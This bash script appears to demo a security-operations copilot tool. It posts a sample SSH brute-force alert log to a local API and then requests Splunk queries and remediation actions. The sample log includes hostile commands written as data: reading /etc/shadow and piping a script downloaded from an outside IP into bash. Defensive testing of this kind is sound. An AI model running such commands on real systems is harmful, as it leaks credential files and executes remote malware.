#!/bin/bash

echo "=== SOC Copilot v0.5.0 Demo Test ==="
echo ""

# 1. 健康检查
echo "1. Health Check..."
curl -s http://localhost:8000/api/health
echo ""
echo ""

# 2. 分析告警
echo "2. Analyzing SSH Brute Force + Malware Alert..."
RESPONSE=$(curl -s -X POST http://localhost:8000/api/analyze-alert \
  -H "Content-Type: application/json" \
  -d '{
    "raw_log": "Feb  7 02:14:15 server-01 sshd[12345]: Failed password for invalid user root from 103.152.112.50 port 45678 ssh2\nFeb  7 02:14:16 server-01 sshd[12345]: Failed password for invalid user admin from 103.152.112.50 port 45679 ssh2\nFeb  7 02:14:17 server-01 sshd[12345]: Failed password for invalid user test from 103.152.112.50 port 45680 ssh2\nFeb  7 02:14:18 server-01 sshd[12345]: Failed password for invalid user ubuntu from 103.152.112.50 port 45681 ssh2\nFeb  7 02:14:19 server-01 sshd[12345]: Failed password for invalid user deploy from 103.152.112.50 port 45682 ssh2\nFeb  7 02:14:20 server-01 sshd[12346]: Accepted password for ubuntu from 192.168.1.100 port 55678 ssh2\nFeb  7 02:14:25 server-01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash\nFeb  7 02:14:30 server-01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=cat /etc/shadow\nFeb  7 02:14:35 server-01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=curl http://185.141.62.210/malware.sh | bash"
  }')

echo "Event Type: $(echo $RESPONSE | grep -o '"event_type":"[^"]*"' | cut -d'"' -f4)"
echo "Severity: $(echo $RESPONSE | grep -o '"severity":"[^"]*"' | cut -d'"' -f4)"
echo ""
echo "IOC IPs: $(echo $RESPONSE | grep -o '"ips":\[[^]]*\]' | head -1)"
echo ""

# 3. 获取历史记录 ID
echo "3. Getting history ID..."
HISTORY_ID=$(curl -s "http://localhost:8000/api/history?module=analyzer&limit=1" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
echo "History ID: $HISTORY_ID"
echo ""

# 4. 生成 Splunk 查询
echo "4. Generating Splunk Queries..."
curl -s -X POST http://localhost:8000/api/playbook/queries \
  -H "Content-Type: application/json" \
  -d "{
    \"module\": \"analyzer\",
    \"history_id\": \"$HISTORY_ID\",
    \"platforms\": [\"splunk\"],
    \"time_ranges\": [\"last_24h\"]
  }" > /tmp/playbook_result.json

echo "Generated Queries:"
cat /tmp/playbook_result.json | grep -o '"name":"[^"]*"' | head -5
echo ""

# 5. 生成处置动作
echo "5. Generating Remediation Actions..."
curl -s -X POST http://localhost:8000/api/playbook/actions \
  -H "Content-Type: application/json" \
  -d "{
    \"history_id\": \"$HISTORY_ID\",
    \"policy\": \"safe\",
    \"include_verification_steps\": true
  }" > /tmp/actions_result.json

echo "Generated Actions:"
cat /tmp/actions_result.json | grep -o '"title":"[^"]*"' | head -5
echo ""

echo "=== Demo Complete ==="
echo "Full results saved to:"
echo "  - /tmp/playbook_result.json"
echo "  - /tmp/actions_result.json"
echo ""
echo "Visit http://localhost:3000 to see the full UI!"
